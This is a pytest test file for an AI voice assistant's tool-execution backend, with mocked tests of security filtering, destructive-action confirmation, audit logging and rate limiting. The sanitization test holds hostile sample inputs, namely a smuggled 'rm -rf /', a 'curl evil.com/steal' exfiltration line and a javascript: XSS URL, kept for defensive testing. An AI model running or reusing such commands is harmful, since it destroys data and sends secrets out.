"""
Integration test for tool execution flow.

Tests:
- Agent tool request → tool execution → result integration
- Security filtering and validation
- Audit logging

Feature: irisvoice-backend-integration
Requirements: 8.1-8.7, 24.1-24.7
"""

import pytest
import asyncio
from unittest.mock import AsyncMock, MagicMock, patch, call
from datetime import datetime


@pytest.mark.asyncio
async def test_complete_tool_execution_flow(mock_agent_kernel, mock_tool_bridge, mock_websocket_manager):
    """Test complete tool execution flow from request to result integration."""
    # Arrange
    session_id = "test-session-tool"
    client_id = "test-client-tool"
    
    # Mock tool execution
    tool_result = {
        "success": True,
        "data": "https://www.example.com opened successfully"
    }
    mock_tool_bridge.execute_tool = AsyncMock(return_value=tool_result)
    
    # Mock agent processing with tool
    mock_agent_kernel.process_text_message = AsyncMock(
        return_value="I've opened the browser to example.com for you."
    )
    
    websocket = AsyncMock()
    mock_websocket_manager.active_connections[client_id] = websocket
    mock_websocket_manager.send_to_client = AsyncMock()
    
    # Act - Step 1: User requests tool action
    user_message = "Open example.com in the browser"
    
    # Step 2: Agent determines tool is needed
    await mock_websocket_manager.send_to_client(client_id, {
        "type": "listening_state",
        "payload": {"state": "processing_tool"}
    })
    
    # Step 3: Execute tool
    result = await mock_tool_bridge.execute_tool(
        "browser_open",
        {"url": "https://www.example.com"}
    )
    
    # Step 4: Send tool result
    await mock_websocket_manager.send_to_client(client_id, {
        "type": "tool_result",
        "payload": {
            "tool_name": "browser_open",
            "result": result
        }
    })
    
    # Step 5: Agent integrates result and responds
    response = await mock_agent_kernel.process_text_message(user_message, session_id)
    
    await mock_websocket_manager.send_to_client(client_id, {
        "type": "text_response",
        "payload": {"text": response, "sender": "assistant"}
    })
    
    # Assert
    mock_tool_bridge.execute_tool.assert_called_once_with(
        "browser_open",
        {"url": "https://www.example.com"}
    )
    assert result["success"] is True
    assert "opened successfully" in result["data"]


@pytest.mark.asyncio
async def test_tool_availability_listing(mock_tool_bridge, mock_websocket_manager):
    """Test listing available tools."""
    # Arrange
    client_id = "test-client-tools"
    
    available_tools = [
        {"name": "browser_open", "description": "Open URL in browser", "server": "BrowserServer"},
        {"name": "app_launch", "description": "Launch application", "server": "AppLauncherServer"},
        {"name": "file_read", "description": "Read file contents", "server": "FileManagerServer"},
        {"name": "system_info", "description": "Get system information", "server": "SystemServer"},
        {"name": "vision_capture", "description": "Capture screen", "server": "VisionSystem"}
    ]
    
    mock_tool_bridge.get_available_tools = MagicMock(return_value=available_tools)
    
    websocket = AsyncMock()
    mock_websocket_manager.active_connections[client_id] = websocket
    mock_websocket_manager.send_to_client = AsyncMock()
    
    # Act
    tools = mock_tool_bridge.get_available_tools()
    
    await mock_websocket_manager.send_to_client(client_id, {
        "type": "agent_tools",
        "payload": {"tools": tools}
    })
    
    # Assert
    assert len(tools) == 5
    mock_websocket_manager.send_to_client.assert_called_once()
    sent_message = mock_websocket_manager.send_to_client.call_args[0][1]
    assert len(sent_message["payload"]["tools"]) == 5


@pytest.mark.asyncio
async def test_security_filtering_and_validation(mock_tool_bridge, mock_security_filter):
    """Test security filtering validates tool parameters."""
    # Arrange
    tool_name = "file_delete"
    params = {"path": "/important/system/file"}
    
    # Mock security filter blocking dangerous operation
    mock_security_filter.validate_params = MagicMock(return_value=False)
    mock_security_filter.get_violation_reason = MagicMock(
        return_value="Path not in allowlist"
    )
    
    mock_tool_bridge.execute_tool = AsyncMock(
        side_effect=PermissionError("Security policy violation: Path not in allowlist")
    )
    
    # Act & Assert
    with pytest.raises(PermissionError, match="Security policy violation"):
        await mock_tool_bridge.execute_tool(tool_name, params)
    
    # Verify security filter was checked
    mock_security_filter.validate_params.assert_called_once()


@pytest.mark.asyncio
async def test_destructive_operation_confirmation(mock_tool_bridge, mock_security_filter, mock_websocket_manager):
    """Test destructive operations require user confirmation."""
    # Arrange
    session_id = "test-session-destructive"
    client_id = "test-client-destructive"
    
    tool_name = "file_delete"
    params = {"path": "/user/documents/file.txt"}
    
    # Mock security filter detecting destructive operation
    mock_security_filter.is_destructive = MagicMock(return_value=True)
    
    websocket = AsyncMock()
    mock_websocket_manager.active_connections[client_id] = websocket
    mock_websocket_manager.send_to_client = AsyncMock()
    
    # Act - Request confirmation
    if mock_security_filter.is_destructive(tool_name):
        await mock_websocket_manager.send_to_client(client_id, {
            "type": "confirmation_required",
            "payload": {
                "tool_name": tool_name,
                "params": params,
                "message": "This will permanently delete the file. Continue?"
            }
        })
    
    # Simulate user confirmation
    user_confirmed = True
    
    if user_confirmed:
        mock_tool_bridge.execute_tool = AsyncMock(return_value={"success": True})
        result = await mock_tool_bridge.execute_tool(tool_name, params)
        
        await mock_websocket_manager.send_to_client(client_id, {
            "type": "tool_result",
            "payload": {"tool_name": tool_name, "result": result}
        })
    
    # Assert
    mock_security_filter.is_destructive.assert_called_once_with(tool_name)
    assert mock_websocket_manager.send_to_client.call_count == 2


@pytest.mark.asyncio
async def test_tool_input_sanitization(mock_security_filter):
    """Test tool inputs are sanitized before execution."""
    # Arrange
    malicious_inputs = [
        {"path": "/etc/passwd; rm -rf /"},
        {"command": "ls && curl evil.com/steal"},
        {"url": "javascript:alert('xss')"}
    ]
    
    def sanitize_input(value):
        """Sanitize input by removing dangerous characters."""
        dangerous_chars = [";", "&&", "||", "|", "`", "$", "(", ")"]
        sanitized = str(value)
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, "")
        return sanitized
    
    mock_security_filter.sanitize_params = MagicMock(side_effect=lambda params: {
        k: sanitize_input(v) for k, v in params.items()
    })
    
    # Act
    sanitized_inputs = [
        mock_security_filter.sanitize_params(params)
        for params in malicious_inputs
    ]
    
    # Assert
    assert ";" not in sanitized_inputs[0]["path"]
    assert "&&" not in sanitized_inputs[1]["command"]
    assert "javascript:" not in sanitized_inputs[2]["url"]


@pytest.mark.asyncio
async def test_audit_logging_of_tool_execution(mock_tool_bridge, mock_audit_logger):
    """Test all tool executions are logged to audit log."""
    # Arrange
    tool_name = "browser_open"
    params = {"url": "https://www.example.com"}
    result = {"success": True}
    
    mock_tool_bridge.execute_tool = AsyncMock(return_value=result)
    mock_audit_logger.log_tool_execution = MagicMock()
    
    # Act
    execution_result = await mock_tool_bridge.execute_tool(tool_name, params)
    
    # Log execution
    mock_audit_logger.log_tool_execution(
        tool_name=tool_name,
        params=params,
        result=execution_result,
        timestamp=datetime.utcnow().isoformat()
    )
    
    # Assert
    mock_audit_logger.log_tool_execution.assert_called_once()
    log_call = mock_audit_logger.log_tool_execution.call_args
    assert log_call[1]["tool_name"] == tool_name
    assert log_call[1]["params"] == params
    assert log_call[1]["result"] == result


@pytest.mark.asyncio
async def test_tool_execution_timeout(mock_tool_bridge):
    """Test tool execution respects timeout (10 seconds)."""
    # Arrange
    tool_name = "slow_operation"
    params = {}
    
    # Mock slow tool execution
    async def slow_execution(name, params):
        await asyncio.sleep(0.2)  # Simulate slow operation
        return {"success": True}
    
    mock_tool_bridge.execute_tool = AsyncMock(side_effect=slow_execution)
    
    # Act & Assert - Timeout after 0.1 seconds
    with pytest.raises(asyncio.TimeoutError):
        await asyncio.wait_for(
            mock_tool_bridge.execute_tool(tool_name, params),
            timeout=0.1
        )


@pytest.mark.asyncio
async def test_tool_execution_error_handling(mock_tool_bridge, mock_websocket_manager):
    """Test tool execution errors are handled gracefully."""
    # Arrange
    session_id = "test-session-error"
    client_id = "test-client-error"
    
    tool_name = "file_read"
    params = {"path": "/nonexistent/file.txt"}
    
    # Mock tool execution failure
    mock_tool_bridge.execute_tool = AsyncMock(
        side_effect=FileNotFoundError("File not found")
    )
    
    websocket = AsyncMock()
    mock_websocket_manager.active_connections[client_id] = websocket
    mock_websocket_manager.send_to_client = AsyncMock()
    
    # Act
    try:
        await mock_tool_bridge.execute_tool(tool_name, params)
    except FileNotFoundError as e:
        # Send error result
        await mock_websocket_manager.send_to_client(client_id, {
            "type": "tool_result",
            "payload": {
                "tool_name": tool_name,
                "result": None,
                "error": str(e)
            }
        })
    
    # Assert
    mock_websocket_manager.send_to_client.assert_called_once()
    error_message = mock_websocket_manager.send_to_client.call_args[0][1]
    assert error_message["payload"]["error"] == "File not found"


@pytest.mark.asyncio
async def test_tool_result_integration_with_context(mock_agent_kernel, mock_tool_bridge, mock_conversation_memory):
    """Test tool results are integrated into conversation context."""
    # Arrange
    session_id = "test-session-context"
    
    # Mock tool execution
    tool_result = {"temperature": 72, "condition": "sunny"}
    mock_tool_bridge.execute_tool = AsyncMock(return_value=tool_result)
    
    # Mock conversation memory
    conversation_history = []
    
    def add_message_side_effect(sid, role, content):
        conversation_history.append({"role": role, "content": content})
    
    mock_conversation_memory.add_message = MagicMock(side_effect=add_message_side_effect)
    mock_conversation_memory.get_context = MagicMock(return_value=conversation_history)
    
    # Act - Execute tool and add to context
    result = await mock_tool_bridge.execute_tool("weather_get", {"location": "San Francisco"})
    
    # Add tool result to conversation context
    mock_conversation_memory.add_message(
        session_id,
        "tool",
        f"Tool: weather_get, Result: {result}"
    )
    
    # Agent uses context to generate response
    mock_agent_kernel.process_text_message = AsyncMock(
        return_value="The weather in San Francisco is sunny with a temperature of 72°F."
    )
    
    response = await mock_agent_kernel.process_text_message(
        "What's the weather?", session_id
    )
    
    # Assert
    context = mock_conversation_memory.get_context(session_id)
    assert len(context) == 1
    assert "weather_get" in context[0]["content"]
    assert "72" in response


@pytest.mark.asyncio
async def test_rate_limiting_tool_execution(mock_tool_bridge, mock_security_filter):
    """Test rate limiting prevents excessive tool executions."""
    # Arrange
    tool_name = "browser_open"
    max_executions = 10
    time_window = 60  # seconds
    
    execution_count = 0
    
    def check_rate_limit():
        nonlocal execution_count
        execution_count += 1
        if execution_count > max_executions:
            raise PermissionError(f"Rate limit exceeded: max {max_executions} per {time_window}s")
        return True
    
    mock_security_filter.check_rate_limit = MagicMock(side_effect=check_rate_limit)
    
    # Act - Execute tool multiple times
    for i in range(max_executions):
        mock_security_filter.check_rate_limit()
    
    # Try to exceed limit
    with pytest.raises(PermissionError, match="Rate limit exceeded"):
        mock_security_filter.check_rate_limit()
    
    # Assert
    assert execution_count == max_executions + 1


@pytest.mark.asyncio
async def test_mcp_server_routing(mock_tool_bridge):
    """Test tools are routed to correct MCP servers."""
    # Arrange
    tool_server_mapping = {
        "browser_open": "BrowserServer",
        "app_launch": "AppLauncherServer",
        "file_read": "FileManagerServer",
        "system_info": "SystemServer",
        "gui_click": "GUIAutomationServer"
    }
    
    mock_tool_bridge.execute_mcp_tool = AsyncMock(return_value={"success": True})
    
    # Act - Execute tools from different servers
    for tool_name, server_name in tool_server_mapping.items():
        await mock_tool_bridge.execute_mcp_tool(server_name, tool_name, {})
    
    # Assert
    assert mock_tool_bridge.execute_mcp_tool.call_count == len(tool_server_mapping)


@pytest.mark.asyncio
async def test_vision_tool_execution(mock_tool_bridge):
    """Test vision system tool execution."""
    # Arrange
    tool_name = "vision_capture"
    params = {"region": "full_screen"}
    
    vision_result = {
        "success": True,
        "image_data": "base64_encoded_image",
        "analysis": "Desktop with browser window open"
    }
    
    mock_tool_bridge.execute_vision_tool = AsyncMock(return_value=vision_result)
    
    # Act
    result = await mock_tool_bridge.execute_vision_tool(tool_name, params)
    
    # Assert
    assert result["success"] is True
    assert "image_data" in result
    assert "analysis" in result


@pytest.mark.asyncio
async def test_parallel_tool_execution(mock_tool_bridge):
    """Test multiple tools can execute in parallel."""
    # Arrange
    tools = [
        ("weather_get", {"location": "SF"}),
        ("news_fetch", {"category": "tech"}),
        ("calendar_check", {"date": "today"})
    ]
    
    async def mock_execute(tool_name, params):
        await asyncio.sleep(0.01)  # Simulate execution time
        return {"success": True, "tool": tool_name}
    
    mock_tool_bridge.execute_tool = AsyncMock(side_effect=mock_execute)
    
    # Act - Execute tools in parallel
    tasks = [
        mock_tool_bridge.execute_tool(tool_name, params)
        for tool_name, params in tools
    ]
    
    results = await asyncio.gather(*tasks)
    
    # Assert
    assert len(results) == 3
    assert all(r["success"] for r in results)


@pytest.mark.asyncio
async def test_tool_execution_with_agent_response(mock_agent_kernel, mock_tool_bridge, mock_websocket_manager):
    """Test complete flow: user request → tool execution → agent response."""
    # Arrange
    session_id = "test-session-complete"
    client_id = "test-client-complete"
    
    # Mock tool execution
    mock_tool_bridge.execute_tool = AsyncMock(return_value={
        "success": True,
        "app": "Chrome",
        "status": "launched"
    })
    
    # Mock agent response incorporating tool result
    mock_agent_kernel.process_text_message = AsyncMock(
        return_value="I've launched Chrome for you."
    )
    
    websocket = AsyncMock()
    mock_websocket_manager.active_connections[client_id] = websocket
    mock_websocket_manager.send_to_client = AsyncMock()
    
    # Act - Complete flow
    user_message = "Launch Chrome"
    
    # Processing state
    await mock_websocket_manager.send_to_client(client_id, {
        "type": "listening_state",
        "payload": {"state": "processing_tool"}
    })
    
    # Execute tool
    tool_result = await mock_tool_bridge.execute_tool("app_launch", {"app": "Chrome"})
    
    # Send tool result
    await mock_websocket_manager.send_to_client(client_id, {
        "type": "tool_result",
        "payload": {"tool_name": "app_launch", "result": tool_result}
    })
    
    # Agent response
    response = await mock_agent_kernel.process_text_message(user_message, session_id)
    
    await mock_websocket_manager.send_to_client(client_id, {
        "type": "text_response",
        "payload": {"text": response, "sender": "assistant"}
    })
    
    # Return to idle
    await mock_websocket_manager.send_to_client(client_id, {
        "type": "listening_state",
        "payload": {"state": "idle"}
    })
    
    # Assert
    assert tool_result["success"] is True
    assert "launched" in response.lower()
    assert mock_websocket_manager.send_to_client.call_count == 4


@pytest.mark.asyncio
async def test_suspicious_activity_detection(mock_audit_logger, mock_security_filter):
    """Test suspicious activity patterns are detected and alerted."""
    # Arrange
    suspicious_patterns = [
        ("file_delete", {"path": "/system/critical"}),
        ("file_delete", {"path": "/etc/passwd"}),
        ("file_delete", {"path": "/usr/bin/sudo"}),
        ("file_delete", {"path": "/boot/vmlinuz"})
    ]
    
    mock_audit_logger.detect_suspicious_pattern = MagicMock(return_value=True)
    mock_audit_logger.alert_suspicious_activity = MagicMock()
    
    # Act - Log multiple suspicious operations
    for tool_name, params in suspicious_patterns:
        if mock_audit_logger.detect_suspicious_pattern(tool_name, params):
            mock_audit_logger.alert_suspicious_activity(
                f"Multiple destructive operations detected: {tool_name}"
            )
    
    # Assert
    assert mock_audit_logger.detect_suspicious_pattern.call_count == len(suspicious_patterns)
    assert mock_audit_logger.alert_suspicious_activity.call_count == len(suspicious_patterns)
